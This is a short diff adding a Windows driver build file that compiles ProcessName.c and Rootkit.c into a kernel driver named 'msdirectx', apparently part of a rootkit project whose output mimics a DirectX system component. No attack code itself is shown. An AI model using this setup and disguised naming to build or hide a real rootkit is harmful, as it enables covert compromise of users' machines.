@@ -1,0 +1,5 @@
+TARGETNAME=msdirectx
+TARGETPATH=..\exe
+TARGETTYPE=DRIVER
+
+SOURCES= ProcessName.c Rootkit.c
